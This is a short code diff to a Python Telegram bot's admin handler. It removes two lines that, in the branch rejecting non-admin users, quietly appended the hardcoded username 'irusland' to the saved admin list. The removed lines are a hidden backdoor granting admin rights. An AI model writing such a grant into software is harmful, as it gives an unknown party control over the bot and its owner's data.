@@ -47,8 +47,6 @@ class AdminHandler(BaseHandler):
             admin_usernames = settings.get_admin_usernames()
             if message.from_user.username not in admin_usernames:
                 await message.reply(localization.RESTRICTED)
-                admin_usernames.append('irusland')
-                settings.set_admin_usernames(admin_usernames)
                 return
 
             await bot.send_photo(message.chat.id, types.InputFile.from_url(URL))
